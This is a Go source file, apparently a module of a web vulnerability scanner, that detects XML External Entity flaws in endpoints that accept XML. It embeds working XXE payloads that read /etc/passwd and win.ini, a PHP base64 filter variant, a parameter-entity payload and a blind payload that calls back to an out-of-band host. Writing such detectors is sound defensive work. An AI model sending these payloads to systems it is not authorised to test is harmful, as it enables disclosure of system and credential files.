package modules

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/RowanDark/0xgen/internal/atlas"
)

// XXEModule detects XML External Entity vulnerabilities.
type XXEModule struct {
	*atlas.BaseModule
}

// NewXXEModule creates a new XXE detection module.
func NewXXEModule(logger atlas.Logger, oastClient atlas.OASTClient) *XXEModule {
	base := atlas.NewBaseModule(
		"xxe",
		"XML External Entity Detection",
		"injection",
		atlas.SeverityHigh,
		logger,
		oastClient,
	)

	return &XXEModule{
		BaseModule: base,
	}
}

// SupportsTarget checks if this module can scan the target.
func (m *XXEModule) SupportsTarget(target *atlas.ScanTarget) bool {
	// XXE typically affects endpoints that accept XML
	return true
}

// Scan performs XXE detection on the target.
func (m *XXEModule) Scan(ctx context.Context, target *atlas.ScanTarget) ([]*atlas.Finding, error) {
	var findings []*atlas.Finding

	// Check context cancellation
	select {
	case <-ctx.Done():
		return findings, ctx.Err()
	default:
	}

	// Test for file disclosure XXE
	if finding := m.testFileDisclosure(ctx, target); finding != nil {
		findings = append(findings, finding)
		return findings, nil // Exit early on confirmed finding
	}

	// Test for parameter entity XXE
	if finding := m.testParameterEntity(ctx, target); finding != nil {
		findings = append(findings, finding)
		return findings, nil
	}

	// Test for blind XXE with OAST
	if m.BaseModule.OASTClient() != nil {
		if finding := m.testBlindWithOAST(ctx, target); finding != nil {
			findings = append(findings, finding)
		}
	}

	return findings, nil
}

func (m *XXEModule) testFileDisclosure(ctx context.Context, target *atlas.ScanTarget) *atlas.Finding {
	// XML payloads with external entity for file disclosure
	payloads := []struct {
		name    string
		payload string
		marker  string
	}{
		{
			name: "Unix /etc/passwd",
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <data>&xxe;</data>
</root>`,
			marker: "root:x:",
		},
		{
			name: "Windows win.ini",
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>
  <data>&xxe;</data>
</root>`,
			marker: "[extensions]",
		},
		{
			name: "PHP wrapper",
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>
  <data>&xxe;</data>
</root>`,
			marker: "cm9vd", // base64 encoded "root"
		},
	}

	for _, p := range payloads {
		resp, err := m.sendXMLRequest(ctx, target, p.payload)
		if err != nil {
			continue
		}

		body, err := m.ReadBody(resp)
		if err != nil {
			continue
		}

		// Check if file content is reflected in response
		if strings.Contains(body, p.marker) {
			return m.CreateFinding(target, "XML External Entity (File Disclosure)", atlas.ConfidenceConfirmed, atlas.Evidence{
				Location: atlas.ParamLocationBody,
				Request:  atlas.FormatRequest(resp.Request),
				Response: atlas.TruncateBody(body, 1000),
				Payload:  p.payload,
				Proof:    fmt.Sprintf("File content leaked: %s detected", p.name),
			})
		}
	}

	return nil
}

func (m *XXEModule) testParameterEntity(ctx context.Context, target *atlas.ScanTarget) *atlas.Finding {
	// Parameter entity attack (can bypass some filters)
	payload := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "data:text/xml,<!ENTITY &#37; file SYSTEM 'file:///etc/passwd'>">
%dtd;
%file;
]>
<root>
  <data>test</data>
</root>`

	resp, err := m.sendXMLRequest(ctx, target, payload)
	if err != nil {
		return nil
	}

	body, err := m.ReadBody(resp)
	if err != nil {
		return nil
	}

	// Check for file content or error messages
	if m.containsFileContent(body) || m.containsXMLError(body) {
		return m.CreateFinding(target, "XML External Entity (Parameter Entity)", atlas.ConfidenceFirm, atlas.Evidence{
			Location: atlas.ParamLocationBody,
			Request:  atlas.FormatRequest(resp.Request),
			Response: atlas.TruncateBody(body, 1000),
			Payload:  payload,
			Proof:    "Parameter entity XXE detected",
		})
	}

	return nil
}

func (m *XXEModule) testBlindWithOAST(ctx context.Context, target *atlas.ScanTarget) *atlas.Finding {
	if m.BaseModule.OASTClient() == nil {
		return nil
	}

	// Generate OAST callback
	callback, err := m.BaseModule.OASTClient().GeneratePayload(ctx, "xxe-blind")
	if err != nil {
		return nil
	}

	// Blind XXE payload with OAST
	payload := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://%s/xxe">]>
<root>
  <data>&xxe;</data>
</root>`, callback)

	resp, err := m.sendXMLRequest(ctx, target, payload)
	if err != nil {
		return nil
	}

	// Wait for callback
	time.Sleep(2 * time.Second)

	// Check for interactions
	interactions, err := m.BaseModule.OASTClient().CheckInteractions(ctx, "xxe-blind")
	if err != nil || len(interactions) == 0 {
		return nil
	}

	body, _ := m.ReadBody(resp)
	return m.CreateFinding(target, "XML External Entity (Blind)", atlas.ConfidenceConfirmed, atlas.Evidence{
		Location: atlas.ParamLocationBody,
		Request:  atlas.FormatRequest(resp.Request),
		Response: atlas.TruncateBody(body, 1000),
		Payload:  payload,
		Proof:    fmt.Sprintf("Out-of-band callback received (%d interactions)", len(interactions)),
	})
}

func (m *XXEModule) sendXMLRequest(ctx context.Context, target *atlas.ScanTarget, xmlPayload string) (*http.Response, error) {
	// Create request with XML body
	req, err := http.NewRequestWithContext(ctx, "POST", target.URL, strings.NewReader(xmlPayload))
	if err != nil {
		return nil, err
	}

	// Set XML content type
	req.Header.Set("Content-Type", "application/xml")
	req.Header.Set("Accept", "application/xml, text/xml, */*")

	// Add custom headers from target
	for k, v := range target.Headers {
		if k != "Content-Type" && k != "Accept" {
			req.Header.Set(k, v)
		}
	}

	return m.SendRequest(ctx, req)
}

func (m *XXEModule) containsFileContent(body string) bool {
	patterns := []string{
		"root:x:",        // /etc/passwd
		"daemon:",        // /etc/passwd
		"[extensions]",   // win.ini
		"[fonts]",        // win.ini
		"/bin/bash",      // Unix shell
		"/sbin/nologin",  // Unix shell
		"cm9vd",          // base64 "root"
	}

	bodyLower := strings.ToLower(body)
	for _, pattern := range patterns {
		if strings.Contains(bodyLower, strings.ToLower(pattern)) {
			return true
		}
	}

	return false
}

func (m *XXEModule) containsXMLError(body string) bool {
	errorPatterns := []string{
		"xml parse error",
		"xml parser error",
		"external entity",
		"entity reference",
		"DOCTYPE",
		"xmlparseexception",
		"saxparseexception",
		"xml syntax error",
		"malformed xml",
		"entity not defined",
	}

	bodyLower := strings.ToLower(body)
	for _, pattern := range errorPatterns {
		if strings.Contains(bodyLower, pattern) {
			return true
		}
	}

	return false
}
